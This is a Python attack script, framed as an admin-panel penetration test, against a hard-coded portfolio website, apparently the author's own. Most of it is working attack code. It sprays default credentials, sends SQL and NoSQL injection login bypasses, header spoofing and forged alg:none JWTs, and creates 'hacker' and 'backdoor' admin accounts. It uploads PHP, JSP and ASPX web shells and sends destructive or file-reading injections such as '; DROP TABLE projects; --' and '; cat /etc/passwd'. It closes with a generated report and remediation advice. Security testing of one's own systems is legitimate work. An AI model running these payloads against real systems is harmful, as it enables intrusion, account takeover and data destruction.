#!/usr/bin/env python3
"""
Specialized Admin Function Penetration Testing Script
Focus on admin panel security, authentication bypass, and privilege escalation
"""

import requests
import json
import time
import threading
import base64
import hashlib
import urllib.parse
from itertools import product
import random
import string

class AdminPenetrationTester:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.findings = []
        
        # Common admin credentials
        self.admin_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('admin', ''),
            ('', 'admin'),
            ('test', 'test'),
            ('demo', 'demo'),
            ('guest', 'guest'),
            ('user', 'user'),
            ('admin', 'qwerty'),
            ('admin', 'letmein'),
            ('admin', 'welcome'),
            ('superadmin', 'superadmin')
        ]
        
        # Admin endpoints to test
        self.admin_endpoints = [
            '/admin',
            '/admin/login',
            '/admin/dashboard',
            '/admin/panel',
            '/admin/index',
            '/admin/home',
            '/admin/main',
            '/admin/users',
            '/admin/user',
            '/admin/projects',
            '/admin/project',
            '/admin/hero',
            '/admin/about',
            '/admin/skills',
            '/admin/contact',
            '/admin/messages',
            '/admin/message',
            '/admin/media',
            '/admin/upload',
            '/admin/file',
            '/admin/settings',
            '/admin/config',
            '/admin/configuration',
            '/admin/analytics',
            '/admin/stats',
            '/admin/logs',
            '/admin/log',
            '/admin/backup',
            '/admin/export',
            '/admin/import',
            '/admin/database',
            '/admin/db',
            '/admin/profile',
            '/admin/account',
            '/administration',
            '/administrator',
            '/manage',
            '/management',
            '/panel',
            '/controlpanel',
            '/cp',
            '/backend',
            '/admin_area',
            '/admin_panel',
            '/admin_console',
            '/admin_interface'
        ]

    def log_finding(self, severity, title, details):
        """Log security findings"""
        finding = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'severity': severity,
            'title': title,
            'details': details
        }
        self.findings.append(finding)
        
        colors = {
            'CRITICAL': '\033[1;91m',
            'HIGH': '\033[0;91m',
            'MEDIUM': '\033[0;93m',
            'LOW': '\033[0;94m',
            'INFO': '\033[0;92m'
        }
        
        color = colors.get(severity, '\033[0m')
        print(f"{color}[{severity}] {title}\033[0m")
        print(f"  Details: {details}")

    def test_admin_discovery(self):
        """Discover admin panels and interfaces"""
        print("\n=== ADMIN PANEL DISCOVERY ===")
        
        discovered_panels = []
        
        for endpoint in self.admin_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", 
                                          timeout=5, 
                                          allow_redirects=True)
                
                # Check response indicators
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Admin panel indicators
                    admin_indicators = [
                        'admin', 'administrator', 'dashboard', 'control panel',
                        'management', 'login', 'username', 'password',
                        'sign in', 'authenticate', 'cms', 'backend'
                    ]
                    
                    score = sum(1 for indicator in admin_indicators if indicator in content)
                    
                    if score >= 3:
                        discovered_panels.append({
                            'endpoint': endpoint,
                            'status': response.status_code,
                            'title': self._extract_title(response.text),
                            'score': score,
                            'size': len(response.text)
                        })
                        
                        self.log_finding('INFO', f'Admin panel discovered: {endpoint}', 
                                       f'Score: {score}, Size: {len(response.text)} bytes')
                        
                        # Check for specific CMS indicators
                        if any(cms in content for cms in ['wordpress', 'drupal', 'joomla']):
                            self.log_finding('MEDIUM', f'CMS admin detected: {endpoint}',
                                           'Known CMS administration interface')
                
                elif response.status_code == 401:
                    self.log_finding('INFO', f'Protected admin endpoint: {endpoint}',
                                   'Returns 401 - Authentication required')
                
                elif response.status_code == 403:
                    self.log_finding('INFO', f'Forbidden admin endpoint: {endpoint}',
                                   'Returns 403 - Access forbidden')
                    
            except Exception as e:
                continue
                
        return discovered_panels

    def _extract_title(self, html):
        """Extract page title from HTML"""
        try:
            start = html.lower().find('<title>') + 7
            end = html.lower().find('</title>')
            if start > 6 and end > start:
                return html[start:end].strip()
        except:
            pass
        return 'Unknown'

    def test_authentication_bypass(self):
        """Test various authentication bypass techniques"""
        print("\n=== AUTHENTICATION BYPASS TESTING ===")
        
        login_endpoints = ['/admin/login', '/admin', '/login']
        
        for endpoint in login_endpoints:
            print(f"\nTesting endpoint: {endpoint}")
            
            # Test 1: SQL Injection Authentication Bypass
            self._test_sql_auth_bypass(endpoint)
            
            # Test 2: NoSQL Injection Bypass
            self._test_nosql_auth_bypass(endpoint)
            
            # Test 3: Default Credentials
            self._test_default_credentials(endpoint)
            
            # Test 4: Header-based Bypass
            self._test_header_bypass(endpoint)
            
            # Test 5: Parameter Pollution
            self._test_parameter_pollution(endpoint)
            
            # Test 6: Session Fixation
            self._test_session_fixation(endpoint)

    def _test_sql_auth_bypass(self, endpoint):
        """Test SQL injection authentication bypass"""
        sql_payloads = [
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' /*",
            "admin'/**/OR/**/1=1--",
            "admin' OR 1=1#",
            "' OR ''='",
            "' OR 1=1 --",
            "') OR ('1'='1' --",
            "admin' OR (SELECT 1)=1 --",
            "' UNION SELECT 1,'admin','5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8' --",
            "admin'; INSERT INTO users VALUES('hacker','pass'); --"
        ]
        
        for payload in sql_payloads:
            try:
                data = {
                    'email': payload,
                    'password': 'test',
                    'username': payload,
                    'login': payload
                }
                
                response = self.session.post(f"{self.target}{endpoint}",
                                           json=data,
                                           headers={'Content-Type': 'application/json'},
                                           timeout=5)
                
                # Check for successful bypass indicators
                success_indicators = [
                    'welcome', 'dashboard', 'admin panel', 'logout',
                    'settings', 'users', 'manage', 'control',
                    'success', 'authenticated', 'token', 'jwt'
                ]
                
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in success_indicators):
                    self.log_finding('CRITICAL', 
                                   f'SQL injection auth bypass: {endpoint}',
                                   f'Payload: {payload}, Status: {response.status_code}')
                
                # Check for SQL errors that indicate vulnerability
                error_indicators = [
                    'sql syntax', 'mysql', 'postgresql', 'sqlite',
                    'syntax error', 'query failed', 'database error'
                ]
                
                if any(error in response_text for error in error_indicators):
                    self.log_finding('HIGH',
                                   f'SQL error in authentication: {endpoint}',
                                   f'Payload: {payload}')
                    
            except Exception:
                continue

    def _test_nosql_auth_bypass(self, endpoint):
        """Test NoSQL injection authentication bypass"""
        nosql_payloads = [
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": {"$exists": True}, "password": {"$exists": True}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$in": ["admin", "administrator"]}, "password": {"$ne": ""}},
            {"email": {"$where": "function(){return true}"}, "password": "test"},
            {"email": {"$or": [{"a": "a"}, {"b": "b"}]}, "password": "test"}
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(f"{self.target}{endpoint}",
                                           json=payload,
                                           headers={'Content-Type': 'application/json'},
                                           timeout=5)
                
                # Check for bypass success
                if response.status_code in [200, 201] and response.status_code != 401:
                    success_indicators = ['welcome', 'dashboard', 'token', 'success']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        self.log_finding('CRITICAL',
                                       f'NoSQL injection auth bypass: {endpoint}',
                                       f'Payload: {str(payload)}')
                        
            except Exception:
                continue

    def _test_default_credentials(self, endpoint):
        """Test default and common credentials"""
        for username, password in self.admin_creds:
            try:
                data = {
                    'email': username,
                    'password': password,
                    'username': username,
                    'login': username
                }
                
                response = self.session.post(f"{self.target}{endpoint}",
                                           json=data,
                                           headers={'Content-Type': 'application/json'},
                                           timeout=5)
                
                # Check for successful login
                if response.status_code in [200, 201, 302]:
                    success_indicators = ['welcome', 'dashboard', 'logout', 'admin']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        self.log_finding('CRITICAL',
                                       f'Default credentials found: {endpoint}',
                                       f'Username: {username}, Password: {password}')
                        return True
                        
                # Check for redirect to admin panel
                if 'location' in response.headers:
                    location = response.headers['location'].lower()
                    if any(admin_term in location for admin_term in ['admin', 'dashboard', 'panel']):
                        self.log_finding('CRITICAL',
                                       f'Default credentials with redirect: {endpoint}',
                                       f'Username: {username}, Password: {password}, Redirect: {location}')
                        
            except Exception:
                continue
                
        return False

    def _test_header_bypass(self, endpoint):
        """Test authentication bypass using headers"""
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Auth': 'admin'},
            {'X-User-Role': 'admin'},
            {'Authorization': 'Bearer admin_token'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
            {'Cookie': 'admin=true; authenticated=1'},
            {'Cookie': 'role=admin; isAdmin=true'},
            {'X-Authenticated': 'true'},
            {'X-Login-Bypass': 'true'}
        ]
        
        # Test on both login endpoint and protected areas
        test_endpoints = [endpoint, '/admin/dashboard', '/admin/users']
        
        for test_endpoint in test_endpoints:
            for headers in bypass_headers:
                try:
                    response = self.session.get(f"{self.target}{test_endpoint}",
                                              headers=headers,
                                              timeout=5)
                    
                    if response.status_code == 200:
                        admin_content = any(term in response.text.lower() 
                                          for term in ['admin', 'dashboard', 'users', 'settings'])
                        auth_required = any(term in response.text.lower()
                                          for term in ['login', 'sign in', 'authenticate'])
                        
                        if admin_content and not auth_required:
                            self.log_finding('HIGH',
                                           f'Header-based auth bypass: {test_endpoint}',
                                           f'Headers: {headers}')
                            
                except Exception:
                    continue

    def _test_parameter_pollution(self, endpoint):
        """Test HTTP parameter pollution for authentication bypass"""
        pollution_payloads = [
            {'email': ['admin', 'test'], 'password': 'admin'},
            {'email': 'admin', 'password': ['admin', 'test']},
            {'email[]': 'admin', 'password': 'admin'},
            {'email': 'admin', 'password[]': 'admin'},
            {'email[0]': 'admin', 'password': 'admin'},
            {'email': 'admin', 'password[0]': 'admin'}
        ]
        
        for payload in pollution_payloads:
            try:
                response = self.session.post(f"{self.target}{endpoint}",
                                           data=payload,
                                           timeout=5)
                
                if response.status_code in [200, 201, 302]:
                    success_indicators = ['welcome', 'dashboard', 'admin']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        self.log_finding('HIGH',
                                       f'Parameter pollution bypass: {endpoint}',
                                       f'Payload: {payload}')
                        
            except Exception:
                continue

    def _test_session_fixation(self, endpoint):
        """Test session fixation vulnerabilities"""
        try:
            # Get initial session
            response1 = self.session.get(f"{self.target}/admin")
            initial_cookies = response1.cookies
            
            # Attempt login
            response2 = self.session.post(f"{self.target}{endpoint}",
                                        json={'email': 'admin', 'password': 'admin'},
                                        timeout=5)
            
            # Check if session ID changed
            if initial_cookies and response2.cookies:
                if initial_cookies == response2.cookies:
                    self.log_finding('MEDIUM',
                                   f'Potential session fixation: {endpoint}',
                                   'Session ID did not change after login attempt')
                    
        except Exception:
            pass

    def test_privilege_escalation(self):
        """Test privilege escalation vulnerabilities"""
        print("\n=== PRIVILEGE ESCALATION TESTING ===")
        
        # Test role manipulation
        self._test_role_manipulation()
        
        # Test user creation with admin privileges
        self._test_admin_user_creation()
        
        # Test parameter tampering
        self._test_parameter_tampering()
        
        # Test JWT manipulation (if JWT is used)
        self._test_jwt_manipulation()

    def _test_role_manipulation(self):
        """Test role manipulation in user operations"""
        user_endpoints = [
            '/api/users',
            '/admin/users',
            '/api/profile',
            '/admin/profile',
            '/api/user/update',
            '/admin/user/update'
        ]
        
        escalation_payloads = [
            {'role': 'admin'},
            {'role': 'administrator'},
            {'is_admin': True},
            {'admin': True},
            {'permissions': ['admin', 'read', 'write', 'delete']},
            {'user_type': 'administrator'},
            {'access_level': 'admin'},
            {'privilege': 'admin'},
            {'group': 'administrators'},
            {'level': 999}
        ]
        
        for endpoint in user_endpoints:
            for payload in escalation_payloads:
                try:
                    # Test POST
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=payload,
                                               timeout=5)
                    
                    if response.status_code in [200, 201]:
                        self.log_finding('HIGH',
                                       f'Potential privilege escalation: {endpoint}',
                                       f'Payload accepted: {payload}')
                    
                    # Test PUT
                    response = self.session.put(f"{self.target}{endpoint}",
                                              json=payload,
                                              timeout=5)
                    
                    if response.status_code in [200, 201]:
                        self.log_finding('HIGH',
                                       f'Potential privilege escalation via PUT: {endpoint}',
                                       f'Payload accepted: {payload}')
                        
                except Exception:
                    continue

    def _test_admin_user_creation(self):
        """Test unauthorized admin user creation"""
        creation_endpoints = [
            '/api/users',
            '/admin/users',
            '/api/register',
            '/admin/register',
            '/api/user/create',
            '/admin/user/create'
        ]
        
        admin_user_payloads = [
            {
                'email': 'hacker@test.com',
                'password': 'hacker123',
                'role': 'admin'
            },
            {
                'username': 'hacker',
                'password': 'hacker123',
                'is_admin': True
            },
            {
                'email': 'backdoor@test.com',
                'password': 'backdoor',
                'permissions': ['admin']
            }
        ]
        
        for endpoint in creation_endpoints:
            for payload in admin_user_payloads:
                try:
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=payload,
                                               timeout=5)
                    
                    if response.status_code in [200, 201]:
                        self.log_finding('CRITICAL',
                                       f'Unauthorized admin user creation: {endpoint}',
                                       f'Created user: {payload}')
                        
                        # Try to login with created user
                        login_response = self.session.post(f"{self.target}/admin/login",
                                                         json={
                                                             'email': payload.get('email', payload.get('username')),
                                                             'password': payload['password']
                                                         },
                                                         timeout=5)
                        
                        if login_response.status_code in [200, 201]:
                            self.log_finding('CRITICAL',
                                           'Created admin user login successful',
                                           f'User: {payload.get("email", payload.get("username"))}')
                            
                except Exception:
                    continue

    def _test_parameter_tampering(self):
        """Test parameter tampering for privilege escalation"""
        # Test ID manipulation
        id_endpoints = [
            '/api/user/1',
            '/admin/user/1',
            '/api/users/1',
            '/admin/users/1'
        ]
        
        for endpoint in id_endpoints:
            try:
                # Test accessing admin user (typically ID 1)
                response = self.session.get(f"{self.target}{endpoint}", timeout=5)
                
                if response.status_code == 200:
                    if any(term in response.text.lower() for term in ['admin', 'administrator']):
                        self.log_finding('MEDIUM',
                                       f'Admin user information disclosure: {endpoint}',
                                       'Admin user details accessible')
                
                # Test modifying admin user
                admin_data = {'role': 'user', 'email': 'hacker@test.com'}
                response = self.session.put(f"{self.target}{endpoint}",
                                          json=admin_data,
                                          timeout=5)
                
                if response.status_code in [200, 201]:
                    self.log_finding('HIGH',
                                   f'Admin user modification possible: {endpoint}',
                                   'Admin user can be modified without authorization')
                    
            except Exception:
                continue

    def _test_jwt_manipulation(self):
        """Test JWT token manipulation for privilege escalation"""
        # This would require actual JWT tokens from successful login
        # For now, test with common JWT patterns
        
        fake_jwt_payloads = [
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.',
        ]
        
        protected_endpoints = ['/admin/dashboard', '/admin/users', '/admin/settings']
        
        for endpoint in protected_endpoints:
            for jwt in fake_jwt_payloads:
                try:
                    headers = {'Authorization': f'Bearer {jwt}'}
                    response = self.session.get(f"{self.target}{endpoint}",
                                              headers=headers,
                                              timeout=5)
                    
                    if response.status_code == 200:
                        admin_content = any(term in response.text.lower() 
                                          for term in ['admin', 'dashboard', 'users'])
                        if admin_content:
                            self.log_finding('HIGH',
                                           f'JWT bypass successful: {endpoint}',
                                           f'Fake JWT accepted: {jwt[:50]}...')
                            
                except Exception:
                    continue

    def test_admin_functionality_abuse(self):
        """Test admin functionality for security issues"""
        print("\n=== ADMIN FUNCTIONALITY ABUSE TESTING ===")
        
        # Test file upload in admin
        self._test_admin_file_upload()
        
        # Test admin CSRF
        self._test_admin_csrf()
        
        # Test admin injection vulnerabilities
        self._test_admin_injection()
        
        # Test admin information disclosure
        self._test_admin_info_disclosure()

    def _test_admin_file_upload(self):
        """Test admin file upload for malicious files"""
        upload_endpoints = [
            '/admin/upload',
            '/api/admin/upload',
            '/admin/media',
            '/api/admin/media'
        ]
        
        malicious_files = {
            'shell.php': '<?php system($_GET["cmd"]); ?>',
            'shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'shell.aspx': '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd", "/c " + Request["cmd"])); %>',
            'xss.svg': '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"><rect width="100" height="100"/></svg>',
            'config.php': '<?php $db_host="localhost"; $db_user="admin"; $db_pass="secret123"; ?>'
        }
        
        for endpoint in upload_endpoints:
            for filename, content in malicious_files.items():
                try:
                    files = {'file': (filename, content, 'text/plain')}
                    response = self.session.post(f"{self.target}{endpoint}",
                                               files=files,
                                               timeout=10)
                    
                    if response.status_code in [200, 201]:
                        self.log_finding('HIGH',
                                       f'Malicious file upload accepted: {endpoint}',
                                       f'File: {filename}, Status: {response.status_code}')
                        
                        # Check if file path is returned
                        if any(indicator in response.text.lower() 
                               for indicator in ['path', 'url', 'location', 'file']):
                            self.log_finding('CRITICAL',
                                           f'Uploaded file path disclosed: {endpoint}',
                                           f'File: {filename}, Response contains file location')
                            
                except Exception:
                    continue

    def _test_admin_csrf(self):
        """Test CSRF protection in admin functions"""
        csrf_test_endpoints = [
            '/admin/users',
            '/admin/projects', 
            '/admin/settings',
            '/admin/upload'
        ]
        
        for endpoint in csrf_test_endpoints:
            try:
                # Test without CSRF token
                headers = {'Origin': 'https://evil.com', 'Referer': 'https://evil.com'}
                response = self.session.post(f"{self.target}{endpoint}",
                                           json={'test': 'csrf'},
                                           headers=headers,
                                           timeout=5)
                
                if response.status_code in [200, 201]:
                    self.log_finding('MEDIUM',
                                   f'Potential CSRF vulnerability: {endpoint}',
                                   'Cross-origin request accepted without CSRF protection')
                    
            except Exception:
                continue

    def _test_admin_injection(self):
        """Test injection vulnerabilities in admin functions"""
        injection_endpoints = [
            '/admin/projects',
            '/admin/hero',
            '/admin/about',
            '/admin/settings'
        ]
        
        injection_payloads = {
            'xss': '<script>alert("Admin XSS")</script>',
            'sql': "'; DROP TABLE projects; --",
            'nosql': {'$ne': ''},
            'ssti': '{{7*7}}',
            'cmd': '; cat /etc/passwd',
            'path': '../../../etc/passwd'
        }
        
        for endpoint in injection_endpoints:
            for injection_type, payload in injection_payloads.items():
                try:
                    data = {
                        'title': payload,
                        'name': payload,
                        'description': payload,
                        'content': payload,
                        'value': payload
                    }
                    
                    response = self.session.post(f"{self.target}{endpoint}",
                                               json=data,
                                               timeout=5)
                    
                    if response.status_code in [200, 201]:
                        # Check for reflected payload
                        if str(payload) in response.text:
                            self.log_finding('HIGH',
                                           f'{injection_type.upper()} injection in admin: {endpoint}',
                                           f'Payload reflected: {payload}')
                        
                        # Check for error indicators
                        error_indicators = {
                            'sql': ['sql', 'syntax', 'mysql', 'postgres'],
                            'cmd': ['command', 'bash', 'sh', 'root:'],
                            'path': ['etc/passwd', 'root:', 'bin/bash']
                        }
                        
                        if injection_type in error_indicators:
                            response_lower = response.text.lower()
                            for indicator in error_indicators[injection_type]:
                                if indicator in response_lower:
                                    self.log_finding('CRITICAL',
                                                   f'{injection_type.upper()} injection successful: {endpoint}',
                                                   f'Indicator found: {indicator}')
                                    break
                                    
                except Exception:
                    continue

    def _test_admin_info_disclosure(self):
        """Test information disclosure in admin functions"""
        info_endpoints = [
            '/admin/logs',
            '/admin/debug',
            '/admin/config',
            '/admin/env',
            '/admin/phpinfo',
            '/admin/info',
            '/admin/status',
            '/admin/health',
            '/admin/version'
        ]
        
        for endpoint in info_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=5)
                
                if response.status_code == 200:
                    sensitive_patterns = [
                        'password', 'secret', 'key', 'token', 'api_key',
                        'database', 'connection', 'config', 'env',
                        'debug', 'error', 'exception', 'stack trace'
                    ]
                    
                    response_lower = response.text.lower()
                    found_patterns = [pattern for pattern in sensitive_patterns 
                                    if pattern in response_lower]
                    
                    if found_patterns:
                        self.log_finding('HIGH',
                                       f'Information disclosure: {endpoint}',
                                       f'Sensitive data exposed: {", ".join(found_patterns)}')
                        
            except Exception:
                continue

    def generate_admin_report(self):
        """Generate detailed admin penetration test report"""
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        report_file = f"admin_pentest_report_{timestamp}.md"
        
        # Group findings by severity
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for finding in self.findings:
            severity_counts[finding['severity']] += 1
        
        report = f"""# Admin Function Penetration Test Report

**Target:** {self.target}
**Test Date:** {time.strftime('%Y-%m-%d %H:%M:%S')}
**Total Findings:** {len(self.findings)}

## Executive Summary

This report details the security assessment of administrative functions and authentication mechanisms.

### Severity Distribution
- 🔴 **CRITICAL:** {severity_counts['CRITICAL']} findings
- 🟠 **HIGH:** {severity_counts['HIGH']} findings
- 🟡 **MEDIUM:** {severity_counts['MEDIUM']} findings
- 🔵 **LOW:** {severity_counts['LOW']} findings
- 🟢 **INFO:** {severity_counts['INFO']} findings

## Detailed Findings

"""
        
        # Group findings by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            severity_findings = [f for f in self.findings if f['severity'] == severity]
            
            if severity_findings:
                emoji = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵', 'INFO': '🟢'}
                report += f"\n### {emoji[severity]} {severity} Findings\n\n"
                
                for i, finding in enumerate(severity_findings, 1):
                    report += f"#### {severity}-{i:02d}: {finding['title']}\n\n"
                    report += f"**Timestamp:** {finding['timestamp']}\n\n"
                    report += f"**Details:** {finding['details']}\n\n"
                    report += "---\n\n"
        
        report += """
## Admin Security Recommendations

### Immediate Actions (CRITICAL/HIGH)
1. **Fix Authentication Bypass Issues**
   - Implement proper SQL injection prevention
   - Add input validation for all authentication fields
   - Use parameterized queries

2. **Secure Admin Panel Access**
   - Implement strong authentication mechanisms
   - Add multi-factor authentication
   - Use strong session management

3. **Fix Privilege Escalation**
   - Implement proper authorization checks
   - Validate user roles on every request
   - Audit user creation and modification functions

### Security Hardening (MEDIUM/LOW)
1. **Add CSRF Protection**
   - Implement CSRF tokens for all state-changing operations
   - Validate Origin and Referer headers

2. **Secure File Upload**
   - Validate file types and extensions
   - Store uploaded files outside web root
   - Scan files for malicious content

3. **Information Security**
   - Remove debug information from production
   - Limit error message details
   - Implement proper logging

### Best Practices
1. **Regular Security Testing**
   - Perform regular penetration testing
   - Implement security code reviews
   - Use automated security scanning

2. **Access Controls**
   - Implement least privilege principle
   - Regular access reviews
   - Strong password policies

3. **Monitoring and Logging**
   - Log all admin activities
   - Monitor for suspicious behavior
   - Implement alerting for security events

## Testing Methodology

This assessment included:

1. **Admin Panel Discovery**
   - Automated endpoint enumeration
   - Common admin path testing
   - Response analysis for admin indicators

2. **Authentication Testing**
   - SQL injection bypass attempts
   - NoSQL injection testing
   - Default credential testing
   - Header-based bypass testing

3. **Authorization Testing**
   - Privilege escalation attempts
   - Role manipulation testing
   - Direct object reference testing

4. **Functionality Testing**
   - File upload security testing
   - CSRF vulnerability testing
   - Input validation testing
   - Information disclosure testing

## Conclusion

The admin functionality assessment revealed {len(self.findings)} security findings.
Priority should be given to addressing CRITICAL and HIGH severity issues immediately.

---
*Report generated by Admin Penetration Testing Suite*
"""
        
        with open(report_file, 'w') as f:
            f.write(report)
            
        print(f"\n📄 Admin penetration test report generated: {report_file}")
        return report_file

def main():
    target_url = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
    
    print("🔥 ADMIN FUNCTION PENETRATION TESTING SUITE")
    print(f"🎯 Target: {target_url}")
    print(f"⏰ Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    tester = AdminPenetrationTester(target_url)
    
    try:
        # Run admin-focused tests
        tester.test_admin_discovery()
        tester.test_authentication_bypass()
        tester.test_privilege_escalation()
        tester.test_admin_functionality_abuse()
        
        # Generate report
        report_file = tester.generate_admin_report()
        
        print("\n" + "=" * 70)
        print("🎉 ADMIN PENETRATION TEST COMPLETED")
        print(f"📊 Total Findings: {len(tester.findings)}")
        print(f"📄 Report: {report_file}")
        
        # Summary of critical findings
        critical_findings = [f for f in tester.findings if f['severity'] == 'CRITICAL']
        if critical_findings:
            print(f"\n🚨 CRITICAL ISSUES FOUND: {len(critical_findings)}")
            for finding in critical_findings[:3]:  # Show first 3
                print(f"   - {finding['title']}")
        
    except KeyboardInterrupt:
        print("\n⚠️  Test interrupted by user")
    except Exception as e:
        print(f"\n❌ Error during testing: {e}")

if __name__ == "__main__":
    main()